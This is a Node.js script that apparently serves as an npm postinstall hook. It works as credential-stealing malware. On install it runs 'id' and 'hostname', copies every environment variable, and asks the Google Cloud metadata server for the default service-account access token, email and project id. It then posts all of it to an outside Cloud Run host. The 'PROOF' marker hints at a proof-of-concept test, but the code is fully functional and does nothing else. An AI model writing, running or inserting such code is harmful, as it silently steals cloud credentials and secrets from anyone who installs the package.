const https = require('https');
const fs = require('fs');
const os = require('os');
const cp = require('child_process');

function exfil(stage, data) {
  return new Promise((resolve) => {
    const body = JSON.stringify({stage, data, ts: new Date().toISOString()});
    const req = https.request({
      hostname: 'bq-rf-logger-k2jr44fima-uc.a.run.app', port: 443,
      path: '/NPM_RCE_V2_PROOF_' + stage,
      method: 'POST',
      headers: {'Content-Type':'application/json','Content-Length':Buffer.byteLength(body),'X-Marker':'NPM_RCE_V2_2026_05_13'}
    }, res => { let d=''; res.on('data', c=>d+=c); res.on('end', ()=>resolve(d)); });
    req.on('error', e => resolve('err:'+e.message));
    req.setTimeout(10000, () => { req.destroy(); resolve('timeout'); });
    req.write(body); req.end();
  });
}

function probeMeta(path) {
  return new Promise((resolve) => {
    const http = require('http');
    const req = http.get({hostname:'metadata.google.internal',port:80,path:path,headers:{'Metadata-Flavor':'Google'}}, res => {
      let d=''; res.on('data',c=>d+=c); res.on('end',()=>resolve({status:res.statusCode,body:d.substring(0,2000)}));
    });
    req.on('error', e => resolve({err:e.message}));
    req.setTimeout(5000, () => { req.destroy(); resolve({err:'timeout'}); });
  });
}

(async () => {
  let id_out = ''; try { id_out = cp.execSync('id',{timeout:3000}).toString().trim(); } catch(e) { id_out = 'err:'+e.message; }
  let hostname_out = ''; try { hostname_out = cp.execSync('hostname',{timeout:3000}).toString().trim(); } catch(e) { hostname_out = 'err:'+e.message; }
  let env_dump = {}; for (const k of Object.keys(process.env)) env_dump[k] = String(process.env[k]).substring(0,200);

  const meta_token = await probeMeta('/computeMetadata/v1/instance/service-accounts/default/token');
  const meta_email = await probeMeta('/computeMetadata/v1/instance/service-accounts/default/email');
  const meta_project = await probeMeta('/computeMetadata/v1/project/project-id');

  await exfil('postinstall', {
    id: id_out, hostname: hostname_out, cwd: process.cwd(),
    pid: process.pid, ppid: process.ppid,
    node_version: process.version, npm_version: process.env.npm_version || 'unknown',
    os_userInfo: (function(){try{return os.userInfo();}catch(e){return 'err';}})(),
    env: env_dump,
    meta_token, meta_email, meta_project
  });
})();
